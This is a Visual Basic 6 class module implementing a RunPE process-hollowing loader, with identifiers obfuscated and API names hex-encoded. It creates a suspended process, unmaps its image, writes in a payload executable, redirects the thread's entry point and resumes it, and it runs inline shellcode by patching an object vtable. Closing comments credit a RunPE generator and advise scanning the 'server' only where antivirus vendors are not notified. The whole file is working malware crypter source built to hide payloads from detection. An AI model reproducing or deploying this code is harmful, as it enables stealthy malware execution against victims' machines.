VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "W2A3L0QaJIyhJfrGnFryVJH"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False

Private Const k6n4R4DdPfildDfKupepgtF       As Long = &H5A4D&
Private Const e0k8B8JabvwHeMpFlrLTJoj        As Long = &H4550&
Private Const K1v6K5tIoGsvWKICURnKiok           As Long = &H40
Private Const y0O6k8EcrLfwsiOWXVaMFMp           As Long = &HF8
Private Const D0S4Z3pFwhPSmPThrMaNAav     As Long = &H28
Private Const y4G4J2mNYSkhEaqmQeAnvUP As Long = &H28
Private Const s8b8B1ennlqOVcHTTimphGV             As String = "8B4C240851<y6A2t8ggIQcFYEctGtrlEBX>E8<H3Y3f8wTUeCiMbIOhpfLGHF>5989016631C0C3"
Private Const P8p7o8elsJjjAprjJlQOykF          As String = "8B5C240854B830000000648B008B400C8B401C8B008B400889035C31C0C3"
Private Const y6A2t8ggIQcFYEctGtrlEBX                    As String = "<y6A2t8ggIQcFYEctGtrlEBX>"
Private Const H3Y3f8wTUeCiMbIOhpfLGHF                    As String = "<H3Y3f8wTUeCiMbIOhpfLGHF>"
Private Const K8o8Z0lCGIAZCgRNBWMDRbK              As Long = &H10007
Private Const K8j2g8IoGsvWKICURnKioky          As Long = &H4
Private Const O6k8E0crLfwsiOWXVaMFMpD                As Long = &H1000
Private Const C3W4Q7FwhPSmPThrMaNAavy               As Long = &H2000
Private Const Y1X1N7NYSkhEaqmQeAnvUPs    As Long = &H40
Private Type r4s8G8bjkinLSZDQPfjmdDS
    cb                          As Long
    lpReserved                  As Long
    lpDesktop                   As Long
    lpTitle                     As Long
    dwX                         As Long
    dwY                         As Long
    dwXSize                     As Long
    dwYSize                     As Long
    dwXCountChars               As Long
    dwYCountChars               As Long
    dwFillAttribute             As Long
    dwFlags                     As Long
    wShowWindow                 As Integer
    cbReserved2                 As Integer
    lpReserved2                 As Long
    hStdInput                   As Long
    hStdOutput                  As Long
    hStdError                   As Long
End Type

Private Type L8c5A5guqZnNNnvJlFkIaAa
    f8n4G1cFKXhDQEpRnmOyNDdess                    As Long
    hThread                     As Long
    dwProcessID                 As Long
    dwThreadID                  As Long
End Type

Private Type l5w6E7wEAMdrABKhcGIouOW
    ControlWord                 As Long
    StatusWord                  As Long
    TagWord                     As Long
    ErrorOffset                 As Long
    ErrorSelector               As Long
    DataOffset                  As Long
    DataSelector                As Long
    RegisterArea(1 To 80)       As Byte
    Cr0NpxState                 As Long
End Type

Private Type M7m7l7bipGggylogFiNLshC
    ContextFlags                As Long
    Dr0                         As Long
    Dr1                         As Long
    Dr2                         As Long
    Dr3                         As Long
    Dr6                         As Long
    Dr7                         As Long
    FloatSave                   As l5w6E7wEAMdrABKhcGIouOW
    SegGs                       As Long
    SegFs                       As Long
    SegEs                       As Long
    SegDs                       As Long
    Edi                         As Long
    Esi                         As Long
    Ebx                         As Long
    Edx                         As Long
    Ecx                         As Long
    Eax                         As Long
    Ebp                         As Long
    Eip                         As Long
    SegCs                       As Long
    EFlags                      As Long
    Esp                         As Long
    SegSs                       As Long
End Type
Private Type s6v1q7ddFNZCVBYqDqoiBwU
    e_magic                     As Integer
    e_cblp                      As Integer
    e_cp                        As Integer
    e_crlc                      As Integer
    e_cparhdr                   As Integer
    e_minalloc                  As Integer
    e_maxalloc                  As Integer
    e_ss                        As Integer
    e_sp                        As Integer
    e_csum                      As Integer
    e_ip                        As Integer
    e_cs                        As Integer
    e_lfarlc                    As Integer
    e_ovno                      As Integer
    e_res(0 To 3)               As Integer
    e_oemid                     As Integer
    e_oeminfo                   As Integer
    e_res2(0 To 9)              As Integer
    e_lfanew                    As Long
End Type

Private Type E2U3c8uQRafJYFLemcIDECH
    Machine                     As Integer
    NumberOfSections            As Integer
    TimeDateStamp               As Long
    PointerToSymbolTable        As Long
    NumberOfSymbols             As Long
    SizeOfOptionalHeader        As Integer
    Characteristics             As Integer
End Type

Private Type r6r4v6DFvWdOJwSJANYHGtf
    VirtuaO3Q5s1PRawsWYFLemcIDDCH              As Long
    Size                        As Long
End Type

Private Type H5p1l0otTHFROkHfkhsyLgh
    Magic                       As Integer
    MajorLinkerVersion          As Byte
    MinorLinkerVersion          As Byte
    SizeOfCode                  As Long
    SizeOfInitializedData       As Long
    SizeOfUnitializedData       As Long
    AddressOfEntryPoint         As Long
    BaseOfCode                  As Long
    BaseOfData                  As Long
    ImageBase                   As Long
    SectionAlignment            As Long
    FileAlignment               As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion           As Integer
    MinorImageVersion           As Integer
    MajorSubsystemVersion       As Integer
    MinorSubsystemVersion       As Integer
    W32VersionValue             As Long
    SizeOfImage                 As Long
    SizeOfHeaders               As Long
    CheckSum                    As Long
    SubSystem                   As Integer
    DllCharacteristics          As Integer
    SizeOfStackReserve          As Long
    SizeOfStackCommit           As Long
    SizeOfHeapReserve           As Long
    SizeOfHeapCommit            As Long
    LoaderFlags                 As Long
    NumberOfRvaAndSizes         As Long
    DataDirectory(0 To 15)      As r6r4v6DFvWdOJwSJANYHGtf
End Type

Private Type q0y4o1bupeKTUSXIBJmAPTV
    Signature                   As Long
    FileHeader                  As E2U3c8uQRafJYFLemcIDECH
    OptionalHeader              As H5p1l0otTHFROkHfkhsyLgh
End Type

Private Type N6C8e2OiLQeoJXKvXtsVCTG
   Characteristics              As Long
   TimeDateStamp                As Long
   MajorVersion                 As Integer
   MinorVersion                 As Integer
   lpName                       As Long
   Base                         As Long
   NumberOfFunctions            As Long
   NumberOfNames                As Long
   lpAddressOfFunctions         As Long
   lpAddressOfNames             As Long
   lpAddressOfNameOrdinals      As Long
End Type
Private Type K6K3P6eBXynjyMbvktRMprY
    SecName                     As String * 8
    VirtualSize                 As Long
    VirtuaO3Q5s1PRawsWYFLemcIDDCH              As Long
    SizeOfRawData               As Long
    PointerToRawData            As Long
    PointerToRelocations        As Long
    PointerToLinenumbers        As Long
    NumberOfRelocations         As Integer
    NumberOfLinenumbers         As Integer
    Characteristics             As Long
End Type

Private Declare Sub CopyBytes Lib "MSVBVM60.DLL" Alias "__vbaCopyBytes" (ByVal Size As Long, Dest As Any, Source As Any)

Private s8G8b6kinLSZDQPfjmdDSLu         As Long
Private c5A5g8qZnNNnvJlFkIaAalf      As Long
Private u5B6u0vJZoywHeZDFlrLTIn         As Boolean
Private j6i7Y5mDdcsildCfKIpepgt          As Long
Private E7m4a0KWSwVnAnkevtRBLRN       As Long
Private o6B6H7CHEPguDENlfJLrwRZ(&HFF)   As Byte
       
Public Function Z7q2O4ucGVCIbjZFAAEohoT() As Long
    'This function will be replaced with machine code laterz
    'Do not add any public procedure on top of it
End Function

Public Function r4b8Y5qBWjXJkHGhPgSWvXi(ByRef w5v6m2BwrKHeAYeampEZbku() As Byte, Optional p3i0V7iYENNMRCuCgtsJMPH As String, Optional ByRef f8n4G1cFKXhDQEpRnmOyNDd As Long) As Boolean
    Dim i                       As Long
    Dim ts6v1q7ddFNZCVBYqDqoiBwU       As s6v1q7ddFNZCVBYqDqoiBwU
    Dim tq0y4o1bupeKTUSXIBJmAPTV       As q0y4o1bupeKTUSXIBJmAPTV
    Dim tK6K3P6eBXynjyMbvktRMprY   As K6K3P6eBXynjyMbvktRMprY
    Dim tr4s8G8bjkinLSZDQPfjmdDS            As r4s8G8bjkinLSZDQPfjmdDS
    Dim tL8c5A5guqZnNNnvJlFkIaAa    As L8c5A5guqZnNNnvJlFkIaAa
    Dim tM7m7l7bipGggylogFiNLshC                As M7m7l7bipGggylogFiNLshC
    Dim j4W8H3uPtSkykhbtqOwIOKW                 As Long
    Dim m7J2U7ZCSFYgVBvvyBlelQq                  As Long
    Dim c7y0q2sXHDrMDsHRAAmZBXj                    As Long
   
    If Not u5B6u0vJZoywHeZDFlrLTIn Then Exit Function

    Call CopyBytes(K1v6K5tIoGsvWKICURnKiok, ts6v1q7ddFNZCVBYqDqoiBwU, w5v6m2BwrKHeAYeampEZbku(0))
   
    If Not ts6v1q7ddFNZCVBYqDqoiBwU.e_magic = k6n4R4DdPfildDfKupepgtF Then
        Exit Function
    End If

    Call CopyBytes(y0O6k8EcrLfwsiOWXVaMFMp, tq0y4o1bupeKTUSXIBJmAPTV, w5v6m2BwrKHeAYeampEZbku(ts6v1q7ddFNZCVBYqDqoiBwU.e_lfanew))
   
    If Not tq0y4o1bupeKTUSXIBJmAPTV.Signature = e0k8B8JabvwHeMpFlrLTJoj Then
        Exit Function
    End If
   
                                    'kernel32
    j4W8H3uPtSkykhbtqOwIOKW = LoadLibrary(i7Y5m0dcsildCfKIpepgtEm("6B65726E656C3332"))                                                                                               'KPC
                                    'ntdll
    m7J2U7ZCSFYgVBvvyBlelQq = LoadLibrary(i7Y5m0dcsildCfKIpepgtEm("6E74646C6C"))                                                                                                   'KPC
   
    If p3i0V7iYENNMRCuCgtsJMPH = vbNullString Then
        p3i0V7iYENNMRCuCgtsJMPH = Space(260)
                                                'H3M5b8UskgsJYthqOJmoVouuleFileNameW
        c7y0q2sXHDrMDsHRAAmZBXj = D7X5h5kIOWANMcgiaAPHrZb(j4W8H3uPtSkykhbtqOwIOKW, i7Y5m0dcsildCfKIpepgtEm("4765744D6F64756C6546696C654E616D6557"))                                                                        'KPC
        t5y0C8SyaKGuPGvKUEDqcEa c7y0q2sXHDrMDsHRAAmZBXj, App.hInstance, StrPtr(p3i0V7iYENNMRCuCgtsJMPH), 260
    End If
   
    With tq0y4o1bupeKTUSXIBJmAPTV.OptionalHeader
       
        tr4s8G8bjkinLSZDQPfjmdDS.cb = Len(tr4s8G8bjkinLSZDQPfjmdDS)
           
                                                'CreateProcessW
        c7y0q2sXHDrMDsHRAAmZBXj = D7X5h5kIOWANMcgiaAPHrZb(j4W8H3uPtSkykhbtqOwIOKW, i7Y5m0dcsildCfKIpepgtEm("43726561746550726F6365737357"))                                                                            'KPC
        t5y0C8SyaKGuPGvKUEDqcEa c7y0q2sXHDrMDsHRAAmZBXj, 0, StrPtr(p3i0V7iYENNMRCuCgtsJMPH), 0, 0, 0, K8j2g8IoGsvWKICURnKioky, 0, 0, VarPtr(tr4s8G8bjkinLSZDQPfjmdDS), VarPtr(tL8c5A5guqZnNNnvJlFkIaAa)

                                                'NtUnmapViewOfSection
        c7y0q2sXHDrMDsHRAAmZBXj = D7X5h5kIOWANMcgiaAPHrZb(m7J2U7ZCSFYgVBvvyBlelQq, i7Y5m0dcsildCfKIpepgtEm("4E74556E6D6170566965774F6653656374696F6E"))                                                                       'KPC
        t5y0C8SyaKGuPGvKUEDqcEa c7y0q2sXHDrMDsHRAAmZBXj, tL8c5A5guqZnNNnvJlFkIaAa.f8n4G1cFKXhDQEpRnmOyNDdess, .ImageBase
       
                                                'VirtualAllocEx
        c7y0q2sXHDrMDsHRAAmZBXj = D7X5h5kIOWANMcgiaAPHrZb(j4W8H3uPtSkykhbtqOwIOKW, i7Y5m0dcsildCfKIpepgtEm("5669727475616C416C6C6F634578"))                                                                            'KPC
        t5y0C8SyaKGuPGvKUEDqcEa c7y0q2sXHDrMDsHRAAmZBXj, tL8c5A5guqZnNNnvJlFkIaAa.f8n4G1cFKXhDQEpRnmOyNDdess, .ImageBase, .SizeOfImage, O6k8E0crLfwsiOWXVaMFMpD Or C3W4Q7FwhPSmPThrMaNAavy, Y1X1N7NYSkhEaqmQeAnvUPs
       
                                                'NtWriteVirtualMemory
        c7y0q2sXHDrMDsHRAAmZBXj = D7X5h5kIOWANMcgiaAPHrZb(m7J2U7ZCSFYgVBvvyBlelQq, i7Y5m0dcsildCfKIpepgtEm("4E7457726974655669727475616C4D656D6F7279"))                                                                       'KPC
        t5y0C8SyaKGuPGvKUEDqcEa c7y0q2sXHDrMDsHRAAmZBXj, tL8c5A5guqZnNNnvJlFkIaAa.f8n4G1cFKXhDQEpRnmOyNDdess, .ImageBase, VarPtr(w5v6m2BwrKHeAYeampEZbku(0)), .SizeOfHeaders, 0
   
        For i = 0 To tq0y4o1bupeKTUSXIBJmAPTV.FileHeader.NumberOfSections - 1
            CopyBytes Len(tK6K3P6eBXynjyMbvktRMprY), tK6K3P6eBXynjyMbvktRMprY, w5v6m2BwrKHeAYeampEZbku(ts6v1q7ddFNZCVBYqDqoiBwU.e_lfanew + y0O6k8EcrLfwsiOWXVaMFMp + y4G4J2mNYSkhEaqmQeAnvUP * i)
            t5y0C8SyaKGuPGvKUEDqcEa c7y0q2sXHDrMDsHRAAmZBXj, tL8c5A5guqZnNNnvJlFkIaAa.f8n4G1cFKXhDQEpRnmOyNDdess, .ImageBase + tK6K3P6eBXynjyMbvktRMprY.VirtuaO3Q5s1PRawsWYFLemcIDDCH, VarPtr(w5v6m2BwrKHeAYeampEZbku(tK6K3P6eBXynjyMbvktRMprY.PointerToRawData)), tK6K3P6eBXynjyMbvktRMprY.SizeOfRawData, 0
        Next i

        tM7m7l7bipGggylogFiNLshC.ContextFlags = K8o8Z0lCGIAZCgRNBWMDRbK
       
                                                'NtGetContextThread
        c7y0q2sXHDrMDsHRAAmZBXj = D7X5h5kIOWANMcgiaAPHrZb(m7J2U7ZCSFYgVBvvyBlelQq, i7Y5m0dcsildCfKIpepgtEm("4E74476574436F6E74657874546872656164"))                                                                         'KPC
        t5y0C8SyaKGuPGvKUEDqcEa c7y0q2sXHDrMDsHRAAmZBXj, tL8c5A5guqZnNNnvJlFkIaAa.hThread, VarPtr(tM7m7l7bipGggylogFiNLshC)
   
                                                'NtWriteVirtualMemory
        c7y0q2sXHDrMDsHRAAmZBXj = D7X5h5kIOWANMcgiaAPHrZb(m7J2U7ZCSFYgVBvvyBlelQq, i7Y5m0dcsildCfKIpepgtEm("4E7457726974655669727475616C4D656D6F7279"))                                                                       'KPC
        t5y0C8SyaKGuPGvKUEDqcEa c7y0q2sXHDrMDsHRAAmZBXj, tL8c5A5guqZnNNnvJlFkIaAa.f8n4G1cFKXhDQEpRnmOyNDdess, tM7m7l7bipGggylogFiNLshC.Ebx + 8, VarPtr(.ImageBase), 4, 0
       
        tM7m7l7bipGggylogFiNLshC.Eax = .ImageBase + .AddressOfEntryPoint
       
                                                'NtSetContextThread
        c7y0q2sXHDrMDsHRAAmZBXj = D7X5h5kIOWANMcgiaAPHrZb(m7J2U7ZCSFYgVBvvyBlelQq, i7Y5m0dcsildCfKIpepgtEm("4E74536574436F6E74657874546872656164"))                                                                         'KPC
        t5y0C8SyaKGuPGvKUEDqcEa c7y0q2sXHDrMDsHRAAmZBXj, tL8c5A5guqZnNNnvJlFkIaAa.hThread, VarPtr(tM7m7l7bipGggylogFiNLshC)
       
                                                'NtResumeThread
        c7y0q2sXHDrMDsHRAAmZBXj = D7X5h5kIOWANMcgiaAPHrZb(m7J2U7ZCSFYgVBvvyBlelQq, i7Y5m0dcsildCfKIpepgtEm("4E74526573756D65546872656164"))                                                                             'KPC
        t5y0C8SyaKGuPGvKUEDqcEa c7y0q2sXHDrMDsHRAAmZBXj, tL8c5A5guqZnNNnvJlFkIaAa.hThread, 0
       
        f8n4G1cFKXhDQEpRnmOyNDd = tL8c5A5guqZnNNnvJlFkIaAa.f8n4G1cFKXhDQEpRnmOyNDdess
    End With
   
    r4b8Y5qBWjXJkHGhPgSWvXi = True
End Function

Public Function t5y0C8SyaKGuPGvKUEDqcEa(ByVal c7y0q2sXHDrMDsHRAAmZBXj As Long, ParamArray Params()) As Long
    Dim D2J4Y8QohdoGVqdnLGjlRlr        As Long
    Dim i           As Long
    Dim o3d5c6FLSvKJZcfXvLEoWYs       As String
    Dim V4n6T5GGhpDedCTtUfZrawg     As String
   
    If c7y0q2sXHDrMDsHRAAmZBXj = 0 Then Exit Function
   
    For i = UBound(Params) To 0 Step -1
        V4n6T5GGhpDedCTtUfZrawg = V4n6T5GGhpDedCTtUfZrawg & "68" & m0i0l7QECyOLhDchdpsIden(CLng(Params(i)))
    Next
   
    D2J4Y8QohdoGVqdnLGjlRlr = VarPtr(o6B6H7CHEPguDENlfJLrwRZ(0))
    D2J4Y8QohdoGVqdnLGjlRlr = D2J4Y8QohdoGVqdnLGjlRlr + (UBound(Params) + 2) * 5
    D2J4Y8QohdoGVqdnLGjlRlr = c7y0q2sXHDrMDsHRAAmZBXj - D2J4Y8QohdoGVqdnLGjlRlr - 5
   
    o3d5c6FLSvKJZcfXvLEoWYs = s8b8B1ennlqOVcHTTimphGV
    o3d5c6FLSvKJZcfXvLEoWYs = Replace(o3d5c6FLSvKJZcfXvLEoWYs, y6A2t8ggIQcFYEctGtrlEBX, V4n6T5GGhpDedCTtUfZrawg)
    o3d5c6FLSvKJZcfXvLEoWYs = Replace(o3d5c6FLSvKJZcfXvLEoWYs, H3Y3f8wTUeCiMbIOhpfLGHF, m0i0l7QECyOLhDchdpsIden(D2J4Y8QohdoGVqdnLGjlRlr))
   
    Call w8W6E4rmbHQRPUFwFjvyMQS(o3d5c6FLSvKJZcfXvLEoWYs)
   
    t5y0C8SyaKGuPGvKUEDqcEa = K6q4J2fINalGTHsUqpRQCGg
End Function

Private Function m0i0l7QECyOLhDchdpsIden(ByVal r8t1W6suEbWACioIQFkggfj As Long) As String
    Dim V5i0a4pfiacHFmbylcqBjjW(3)   As Byte
    Dim i           As Long
   
    CopyBytes &H4, V5i0a4pfiacHFmbylcqBjjW(0), r8t1W6suEbWACioIQFkggfj
    For i = 0 To 3
        m0i0l7QECyOLhDchdpsIden = m0i0l7QECyOLhDchdpsIden & Right("0" & Hex(V5i0a4pfiacHFmbylcqBjjW(i)), 2)
    Next
End Function

Private Sub w8W6E4rmbHQRPUFwFjvyMQS(ByVal t3d7S6RoHTHEQOkUekgsKKg As String)
    Dim i   As Long
    For i = 0 To Len(t3d7S6RoHTHEQOkUekgsKKg) - 1 Step 2
        o6B6H7CHEPguDENlfJLrwRZ((i / 2)) = CByte("&h" & Mid$(t3d7S6RoHTHEQOkUekgsKKg, i + 1, 2))
    Next i
End Sub

Private Function K6q4J2fINalGTHsUqpRQCGg() As Long
    CopyBytes &H4, j6i7Y5mDdcsildCfKIpepgt, ByVal ObjPtr(Me)
    j6i7Y5mDdcsildCfKIpepgt = j6i7Y5mDdcsildCfKIpepgt + &H1C
    CopyBytes &H4, E7m4a0KWSwVnAnkevtRBLRN, ByVal j6i7Y5mDdcsildCfKIpepgt
    CopyBytes &H4, ByVal j6i7Y5mDdcsildCfKIpepgt, VarPtr(o6B6H7CHEPguDENlfJLrwRZ(0))
    K6q4J2fINalGTHsUqpRQCGg = Z7q2O4ucGVCIbjZFAAEohoT
    CopyBytes &H4, ByVal j6i7Y5mDdcsildCfKIpepgt, E7m4a0KWSwVnAnkevtRBLRN
End Function

Public Function H3M5b8UskgsJYthqOJmoVou(ByVal V2m2t5ZOiZQdnXWKyXtGUCT As String, ByVal h7O8Z7VbuDsYTUSXIBImNPS As String) As Long
    H3M5b8UskgsJYthqOJmoVou = Me.D7X5h5kIOWANMcgiaAPHrZb(Me.LoadLibrary(V2m2t5ZOiZQdnXWKyXtGUCT), h7O8Z7VbuDsYTUSXIBImNPS)
End Function

Public Function LoadLibrary(ByVal V2m2t5ZOiZQdnXWKyXtGUCT As String) As Long
    LoadLibrary = t5y0C8SyaKGuPGvKUEDqcEa(c5A5g8qZnNNnvJlFkIaAalf, StrPtr(V2m2t5ZOiZQdnXWKyXtGUCT & vbNullChar))
End Function

Public Property Get Initialized() As Boolean
    Initialized = u5B6u0vJZoywHeZDFlrLTIn
End Property

Public Sub Class_Initialize()

    Call w8W6E4rmbHQRPUFwFjvyMQS(P8p7o8elsJjjAprjJlQOykF)
   
    s8G8b6kinLSZDQPfjmdDSLu = K6q4J2fINalGTHsUqpRQCGg
   
    If Not s8G8b6kinLSZDQPfjmdDSLu = 0 Then
        c5A5g8qZnNNnvJlFkIaAalf = D7X5h5kIOWANMcgiaAPHrZb(s8G8b6kinLSZDQPfjmdDSLu, "LoadLibraryW")
        If Not c5A5g8qZnNNnvJlFkIaAalf = 0 Then
            u5B6u0vJZoywHeZDFlrLTIn = True
        End If
    End If
End Sub

Public Function D7X5h5kIOWANMcgiaAPHrZb(ByVal c7y0q2sXHDrMDsHRAAmZBXj As Long, ByVal h7O8Z7VbuDsYTUSXIBImNPS As String) As Long
    Dim ts6v1q7ddFNZCVBYqDqoiBwU       As s6v1q7ddFNZCVBYqDqoiBwU
    Dim tq0y4o1bupeKTUSXIBJmAPTV       As q0y4o1bupeKTUSXIBJmAPTV
    Dim tN6C8e2OiLQeoJXKvXtsVCTG As N6C8e2OiLQeoJXKvXtsVCTG
   
    Call CopyBytes(K1v6K5tIoGsvWKICURnKiok, ts6v1q7ddFNZCVBYqDqoiBwU, ByVal c7y0q2sXHDrMDsHRAAmZBXj)
   
    If Not ts6v1q7ddFNZCVBYqDqoiBwU.e_magic = k6n4R4DdPfildDfKupepgtF Then
        Exit Function
    End If

    Call CopyBytes(y0O6k8EcrLfwsiOWXVaMFMp, tq0y4o1bupeKTUSXIBJmAPTV, ByVal c7y0q2sXHDrMDsHRAAmZBXj + ts6v1q7ddFNZCVBYqDqoiBwU.e_lfanew)
   
    If Not tq0y4o1bupeKTUSXIBJmAPTV.Signature = e0k8B8JabvwHeMpFlrLTJoj Then
        Exit Function
    End If
   
    Dim F1j4V2heBWyBwJMbvwHRMpF   As Long
    Dim Y7L1u4jkinYRYDQPfjldDSK      As Long
    Dim u5e0b5tFZmaMnKJkSjWaAal       As Long
   
    With tq0y4o1bupeKTUSXIBJmAPTV.OptionalHeader
        F1j4V2heBWyBwJMbvwHRMpF = c7y0q2sXHDrMDsHRAAmZBXj + .DataDirectory(0).VirtuaO3Q5s1PRawsWYFLemcIDDCH
        Y7L1u4jkinYRYDQPfjldDSK = F1j4V2heBWyBwJMbvwHRMpF + .DataDirectory(0).Size
        u5e0b5tFZmaMnKJkSjWaAal = .ImageBase
    End With
   
    Call CopyBytes(D0S4Z3pFwhPSmPThrMaNAav, tN6C8e2OiLQeoJXKvXtsVCTG, ByVal F1j4V2heBWyBwJMbvwHRMpF)
       
    Dim i           As Long
    Dim f8u3n2EAMcrNBKhcGIoIOWL   As Long
    Dim q0B0E4hpTgfyACtTiaLsuQs    As Long
    Dim v2H7E5dENZCVAYqQqCyOvUE    As Long

    With tN6C8e2OiLQeoJXKvXtsVCTG
        For i = 0 To .NumberOfNames - 1
           
            CopyBytes 4, q0B0E4hpTgfyACtTiaLsuQs, ByVal u5e0b5tFZmaMnKJkSjWaAal + .lpAddressOfNames + i * 4
           
            If B6u0v1ZoywHeZDFlrLTInjj(u5e0b5tFZmaMnKJkSjWaAal + q0B0E4hpTgfyACtTiaLsuQs) = h7O8Z7VbuDsYTUSXIBImNPS Then
                CopyBytes 2, v2H7E5dENZCVAYqQqCyOvUE, ByVal u5e0b5tFZmaMnKJkSjWaAal + .lpAddressOfNameOrdinals + i * 2
                CopyBytes 4, f8u3n2EAMcrNBKhcGIoIOWL, ByVal u5e0b5tFZmaMnKJkSjWaAal + .lpAddressOfFunctions + v2H7E5dENZCVAYqQqCyOvUE * 4
               
                D7X5h5kIOWANMcgiaAPHrZb = f8u3n2EAMcrNBKhcGIoIOWL + u5e0b5tFZmaMnKJkSjWaAal
                             
                If D7X5h5kIOWANMcgiaAPHrZb >= F1j4V2heBWyBwJMbvwHRMpF And _
                   D7X5h5kIOWANMcgiaAPHrZb <= Y7L1u4jkinYRYDQPfjldDSK Then
                    Call y4d7n4jJKktGhCgFXvXicud(D7X5h5kIOWANMcgiaAPHrZb, c7y0q2sXHDrMDsHRAAmZBXj, h7O8Z7VbuDsYTUSXIBImNPS)
                    If Not c7y0q2sXHDrMDsHRAAmZBXj = 0 Then
                        D7X5h5kIOWANMcgiaAPHrZb = D7X5h5kIOWANMcgiaAPHrZb(c7y0q2sXHDrMDsHRAAmZBXj, h7O8Z7VbuDsYTUSXIBImNPS)
                    Else
                        D7X5h5kIOWANMcgiaAPHrZb = 0
                    End If
                End If
               
                Exit Function
            End If
        Next
    End With
   
End Function

Private Function y4d7n4jJKktGhCgFXvXicud( _
       ByVal O3Q5s1PRawsWYFLemcIDDCH As Long, _
       ByRef r0G4v8MCFvVdbJwSJANXGGt As Long, _
       ByRef q3a6P6NlEPEBuNKhRbhdpGH As String)
       
    Dim c5n2s4lSYrAoVQQPUFwFjKy     As String

    c5n2s4lSYrAoVQQPUFwFjKy = B6u0v1ZoywHeZDFlrLTInjj(O3Q5s1PRawsWYFLemcIDDCH)
    If InStr(1, c5n2s4lSYrAoVQQPUFwFjKy, ".") Then
        r0G4v8MCFvVdbJwSJANXGGt = LoadLibrary(Split(c5n2s4lSYrAoVQQPUFwFjKy, ".")(0))
        q3a6P6NlEPEBuNKhRbhdpGH = Split(c5n2s4lSYrAoVQQPUFwFjKy, ".")(1)
    End If
   
End Function
Private Function B6u0v1ZoywHeZDFlrLTInjj( _
       ByVal O3Q5s1PRawsWYFLemcIDDCH As Long) As String
       
    Dim C3o1C7XghfkVOVANMcfiaOH       As Byte
   
    Do
        CopyBytes 1, C3o1C7XghfkVOVANMcfiaOH, ByVal O3Q5s1PRawsWYFLemcIDDCH
        O3Q5s1PRawsWYFLemcIDDCH = O3Q5s1PRawsWYFLemcIDDCH + 1
        If C3o1C7XghfkVOVANMcfiaOH = 0 Then Exit Do
        B6u0v1ZoywHeZDFlrLTInjj = B6u0v1ZoywHeZDFlrLTInjj & Chr$(C3o1C7XghfkVOVANMcfiaOH)
    Loop
   
End Function
Private Function i7Y5m0dcsildCfKIpepgtEm(ByVal o3d5c6FLSvKJZcfXvLEoWYs As String) As String
    Dim i       As Long
    For i = 1 To Len(o3d5c6FLSvKJZcfXvLEoWYs) Step 2
       i7Y5m0dcsildCfKIpepgtEm = i7Y5m0dcsildCfKIpepgtEm & Chr$(Val("&H" & Mid$(o3d5c6FLSvKJZcfXvLEoWYs, i, 2)))
    Next i
End Function

 'RunPE function is r4b8Y5qBWjXJkHGhPgSWvXi
 'RunPE Made by : br1337 RUNPE Generator
 'Never upload your server to another scan site, 
'just to www.novirusthanks.org and check the checkbox ' do not distribute the example ' 
 'Thanks :P